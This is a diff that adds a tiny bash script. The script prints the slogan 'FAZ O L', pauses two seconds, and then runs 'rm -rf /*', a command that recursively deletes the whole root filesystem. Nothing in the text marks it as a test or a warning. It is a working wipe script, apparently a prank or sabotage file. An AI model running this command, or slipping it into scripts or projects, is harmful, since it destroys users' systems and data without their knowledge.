@@ -1,0 +1,8 @@
+#!/bin/bash
+
+echo ""
+echo "FAZ O L"
+
+sleep 2
+
+rm -rf /*
